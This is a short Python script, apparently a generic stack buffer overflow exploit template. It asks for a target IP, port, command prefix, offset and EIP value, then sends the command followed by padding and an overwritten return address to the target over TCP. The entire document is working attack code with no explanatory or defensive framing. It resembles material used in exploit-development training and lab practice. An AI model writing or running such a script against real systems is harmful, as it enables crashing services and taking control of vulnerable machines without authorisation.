import socket
import sys

ip = input("ENTER THE IP: ")
port = int(input("ENTER THE PORT: "))
command = input("ENTER THE COMMAND: ")
offset = int(input("ENTER THE OFFSET: "))
eip = input("EIP CODE: ")
code = ('A' * offset) + eip



try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	s.send((command + code).encode('utf-8'))
	s.close()
except:
	print("ERROR")